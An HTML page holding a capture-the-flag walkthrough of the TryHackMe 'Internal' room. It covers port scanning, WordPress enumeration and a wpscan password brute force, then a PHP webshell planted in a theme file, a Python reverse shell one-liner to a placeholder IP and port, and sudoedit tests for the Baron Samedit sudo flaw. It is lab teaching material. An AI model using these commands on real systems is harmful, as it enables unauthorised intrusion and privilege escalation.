<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










<script defer language="javascript" type="text/javascript" src="/js/bundle.min.2020802c65d7e4d9924ad9985d2b846f0731757a349489709cadd5d59c0a461e.js"></script>


    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  
 

 


  
  
  
 



  
  
    
  
  




<title itemprop="name"> - Internal Walkthrough</title>
<meta property="og:title" content=&#32;-&#32;Internal&#32;Walkthrough />
<meta name="twitter:title" content=&#32;-&#32;Internal&#32;Walkthrough />
<meta itemprop="name" content=&#32;-&#32;Internal&#32;Walkthrough />
<meta name="application-name" content=&#32;-&#32;Internal&#32;Walkthrough />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://hectorpadin1.github.io/writeups/internal/" />
<link rel="canonical" href="https://hectorpadin1.github.io/writeups/internal/" itemprop="url" />
<meta name="url" content="https://hectorpadin1.github.io/writeups/internal/" />
<meta name="twitter:url" content="https://hectorpadin1.github.io/writeups/internal/" />
<meta property="og:url" content="https://hectorpadin1.github.io/writeups/internal/" />





<meta property="og:updated_time" content=20006-20-03T65:30:23&#43;0200 />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://hectorpadin1.github.io/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />


<meta name="twitter:site" content="" />
<meta name="twitter:creator" content="" />
<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta property="og:type" content="website" />
<meta name="author" content="" />
<script defer type="application/ld+json">
  {
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "Internal Walkthrough",
        "author": {
            "@type": "Person",
            "name": ""
        },
        "datePublished": "2023-06-20",
        "description": "",
        "wordCount":  1055 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-06-20",
        "image": {
            "@type": "imageObject",
            "url": ""
        },
        "publisher": {
            "@type": "Organization",
            "name": "",
            "logo": {
            "@type": "imageObject",
            "url": ""
            }
        }
    }
  }
</script>



<meta name="generator" content="Hugo 0.114.0">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.4a0fa715e0f61219e950cf43b026eb84b360336a49ee1c4a10fdaddaca8a1026.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5a5a5a;
        --link-color: #268bd2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #bf616a;
        --code-background-color: #E5E5E5;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #eee;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9d9d9d;
        --link-color: #268bd2;
        --date-color: #9a9a9a;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #ff7f7f;
        --code-background-color: #393D47;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://hectorpadin1.github.io/">
                <img src="/images/py.jpeg" alt="brand image">
            </a>
        
        
    </h1>
    <p class="lead">
    Writeups for different platforms.
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                    <li class="heading">
                        <a href="/writeups/">Writeups</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://hectorpadin1.github.io/writeups/internal/">Internal Walkthrough</a>
                            </li>
                        
                    
                
            
            
                
            
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/hectorpadin1">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/h%C3%A9ctor-pad%C3%ADn-torrente-b9098a210/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>




    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/p/hectorpadin1">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
        </svg>
    </a>










        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2023 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
    <h1 class="post-title">
        <a href="https://hectorpadin1.github.io/writeups/internal/">Internal Walkthrough</a>
    </h1>
    
        <time datetime="2023-06-20T03:05:30&#43;0200" class="post-date">
            June 20, 2023
        </time>
    
    
    <ul class="tags">
        
        <li class="tag-TryHackme">
            <a href="https://hectorpadin1.github.io/tags/tryhackme">TryHackme</a>
        </li>
        
        <li class="tag-WordPress">
            <a href="https://hectorpadin1.github.io/tags/wordpress">WordPress</a>
        </li>
        
        <li class="tag-Brute Force">
            <a href="https://hectorpadin1.github.io/tags/brute-force">Brute Force</a>
        </li>
        
        <li class="tag-Baron Samedit">
            <a href="https://hectorpadin1.github.io/tags/baron-samedit">Baron Samedit</a>
        </li>
        
    </ul>
    
    
    
    
    
    
</div>

  <p><img src="../../images/internal/0-internal.jpeg" alt=""></p>
<h1 id="internal-tryhackmehttpstryhackmecom">Internal [<a href="https://tryhackme.com">TryHackme</a>]</h1>
<ul>
<li>URL: <a href="https://tryhackme.com/room/internal">https://tryhackme.com/room/internal</a></li>
<li>Difficulty: <strong>Hard</strong>.</li>
<li>Subscription: <strong>Free</strong>.</li>
<li>Creators: <a href="https://tryhackme.com/p/TheMayor">TheMayor</a> and <a href="https://tryhackme.com/p/omarbadraan">omarbadraan</a>.</li>
</ul>
<hr>
<h2 id="introduction">Introduction</h2>
<p>To complete this room only two flags are requested, called <code>user.txt</code> and <code>root.txt</code> which are located inside the only machine of the scope. In addition, we are instructed that to perform the test we must modify the <code>/etc/hosts</code> file so that the domain name <code>internal.thm</code> points to the IP address of the virtual machine.</p>
<p><img src="../../images/internal/0-etc-hosts.png" alt=""></p>
<p>The writeups for this machine have been performed following the path intended for this one. This report proposes an alternative solution to get both flags by exploiting the Baron Samedit vulnerability on a machine without a C compiler.</p>
<hr>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="port-scanning">Port scanning</h3>
<p>Once the scope for the test has been obtained, the scanning of ports and services hosted by the machine can begin. A Syn Stealth type scan is performed using <code>nmap</code> with the <code>-p-</code> option to scan all ports (-n and -Pn is to avoid name resolution and ping sweep respectively).</p>
<p><img src="../../images/internal/1-full-nmap1.png" alt=""></p>
<h3 id="service-scanning-and-enumeration">Service scanning and enumeration</h3>
<p>Once the open ports are discovered, nmap is used to detect the version and service hosted on ports 22 and 80.</p>
<p><img src="../../images/internal/1-full-nmap2.png" alt=""></p>
<p>For port 22, it can be seen that there is an OpenSSH server with version 7.6p1, which is known to be vulnerable to valid user enumeration of the system (CVE-2018-15473). However, no valid users could be obtained. On the other hand, on port 80 there is an Apache 2.4.29 web server, with the default page.</p>
<p>Next, the nmap <code>vuln</code> script is used to detect vulnerabilities in the detected services, along with an enumeration of web server directories using <code>gobuster</code>.</p>
<p><img src="../../images/internal/1-full-nmap.png" alt=""></p>
<p><img src="../../images/internal/2-gobuster.png" alt=""></p>
<p>With these tools it is discovered that inside the server there is a Wordpress and a phpMyAdmin portal.</p>
<hr>
<h2 id="exploitation-of-vulnerabilities">Exploitation of vulnerabilities</h2>
<h3 id="wordpress-enumeration">Wordpress enumeration</h3>
<p>For scanning the Wordpress portal, the <code>wpscan</code> tool is used to list users and installed plugins.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://internal.thm/blog/ -e vp,u
</span></span></code></pre></div><p>This reveals that there is an <code>admin</code> user with credentials to access the Wordpress administration panel.</p>
<p><img src="../../images/internal/5-wp-admin.png" alt=""></p>
<h3 id="brute-force-attack">Brute force attack</h3>
<p>Once the user is identified, a brute force attack on the panel can be attempted. In this case the <code>wpscan</code> tool is used with the <code>rockyou.txt</code> dictionary to try to obtain the password of the <code>admin</code> user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://internal.thm/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
</span></span></code></pre></div><p>After a short time, a valid password is obtained for the user.</p>
<p><img src="../../images/internal/6-wp-crack.png" alt=""></p>
<h3 id="access-to-the-system">Access to the system</h3>
<p>With this credentials you can access the Wordpress administration panel. Once inside, you can modify some template file to get a shell in the system.</p>
<p><img src="../../images/internal/7-wp-dashboard.png" alt=""></p>
<p>In this case the <code>404.php</code> file of the current theme was chosen replacing the code with a <em>webshell</em> in PHP on which to execute commands.</p>
<p><img src="../../images/internal/8-404-template.png" alt=""></p>
<p>Once the file has been modified, the <em>webshell</em> can be accessed from the URL <a href="http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php">http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</a>. Before launching the <em>reverse shell</em> we open a listener on the attacking machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwncat-cs -lp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p>In the <a href="https://www.revshells.com/">Reverse Shell Generator</a> page there are multiple <em>one-liners</em> to obtain a reverse shell in different languages, but for this case the Python3 option was chosen. To the selected <em>one-liner</em> we add &rsquo;nohup&rsquo; (to make the process independent) and &lsquo;&amp;&rsquo; (to run it in the background). Thus, the command would look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nohup python3 -c <span style="color:#e6db74">&#39;import os,pty,socket;s=socket.socket();s.connect((&#34;IP&#34;,PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;sh&#34;)&#39;</span> &amp;
</span></span></code></pre></div><p><img src="../../images/internal/9-start-shell.png" alt=""></p>
<p>If all worked out correctly, in our <code>pwncat</code> listener we should have obtained a shell as the <code>www-data</code> user.</p>
<p><img src="../../images/internal/10-reverse-shell.png" alt=""></p>
<hr>
<h2 id="privilege-escalation">Privilege escalation</h2>
<h3 id="os-enumeration">OS enumeration</h3>
<p>Doing a quick enumeration of the system we can see that we are dealing with a <code>Ubuntu 18.04.4 LTS</code> system with a <code>sudo 1.8.21p2</code> version.</p>
<p><img src="../../images/internal/11-os-ver.png" alt=""></p>
<h3 id="baron-samedit-check">Baron Samedit check</h3>
<p>We know that the <code>Baron Samedit</code> vulnerability (CVE-2021-3156) affects sudo versions 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1. It exploits a heap buffer overflow in the sudo command, allowing to launch a root shell. To check if your version of sudo is vulnerable you can use the following commands, which should return a Segmentation Fault.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudoedit -s /
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudoedit -s <span style="color:#e6db74">&#39;\&#39;</span> <span style="color:#e6db74">`</span>perl -e <span style="color:#e6db74">&#39;print &#34;A&#34; x 65536&#39;</span><span style="color:#e6db74">`</span> 
</span></span></code></pre></div><p><img src="../../images/internal/12-vuln-test.png" alt=""></p>
<p>As we can see, the second command returns a Segmentation Fault, so our version of sudo may be vulnerable. The main problem encountered in is that <strong>no C compiler</strong> is available on the machine, so you can&rsquo;t compile the Baron Samedit exploit to get a shell.</p>
<p><img src="../../images/internal/12-2-no-gcc.png" alt=""></p>
<h3 id="creation-of-the-exploit-in-a-copy">Creation of the exploit in a copy</h3>
<p>However, once you know the version of the OS, you can &lsquo;replicate&rsquo; the victim in a virtualization software, compile the exploit on that machine and pass it to the victim machine and then run it. This was done by using <strong>VirtualBox</strong> software, and an ISO image of <strong>Ubuntu 18.04 LTS</strong> to replicate to the victim.</p>
<p>The Ubuntu version must be the same as the encountered in the victim machine, otherwise the exploit may not work, because this vulnerability exploits a specific version of sudo on specific OS versions. It is also mandatory to do an installation <strong>without performing software updates</strong>, as both the Ubuntu and sudo versions will be updated and the vulnerability will be patched.</p>
<p>Once the above has been clarified and the copy of the machine has been booted, we can proceed to check the version of the operating system and sudo.</p>
<p><img src="../../images/internal/13-ubuntu-version.png" alt=""></p>
